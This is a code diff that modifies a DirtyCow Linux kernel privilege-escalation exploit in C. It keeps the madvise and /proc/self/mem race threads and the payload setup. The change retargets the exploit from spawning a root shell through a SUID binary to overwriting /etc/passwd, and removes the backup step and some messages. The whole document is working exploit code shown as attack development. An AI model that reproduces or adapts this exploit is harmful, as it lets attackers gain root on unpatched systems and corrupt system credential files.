@@ -69,7 +69,7 @@ void *madviseThread(void *arg)
     for(i=0;i<1000000 && !stop;i++) {
         c+=madvise(map,100,MADV_DONTNEED);
     }
-    printf("thread stopped\n");
+    printf("[*] madviseThread stopped\n");
 }
 
 void *procselfmemThread(void *arg)
@@ -82,7 +82,7 @@ void *procselfmemThread(void *arg)
         lseek(f,map,SEEK_SET);
         c+=write(f, str, sc_len);
     }
-    printf("thread stopped\n");
+    printf("[*] procselfmemThread stopped\n");
 }
 
 void *waitForWrite(void *arg) {
@@ -94,7 +94,6 @@ void *waitForWrite(void *arg) {
         fread(buf, sc_len, 1, fp);
 
         if(memcmp(buf, sc, sc_len) == 0) {
-            printf("%s overwritten\n", suid_binary);
             break;
         }
 
@@ -104,25 +103,14 @@ void *waitForWrite(void *arg) {
 
     stop = 1;
 
-    printf("Popping root shell.\n");
-    printf("Don't forget to restore /tmp/bak\n");
-
-    system(suid_binary);
+    printf("[*] /etc/passwd overwritten");
 }
 
 int main(int argc,char *argv[]) {
-    char *backup;
-
-    printf("DirtyCow root privilege escalation\n");
-    printf("Backing up %s to /tmp/bak\n", suid_binary);
-
-    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
-    system(backup);
+    printf("[*] LPE by overwriting /etc/passwd\n");
 
     f = open(suid_binary,O_RDONLY);
     fstat(f,&st);
-
-    printf("Size of binary: %d\n", st.st_size);
 
     char payload[st.st_size];
     memset(payload, 0x90, st.st_size);
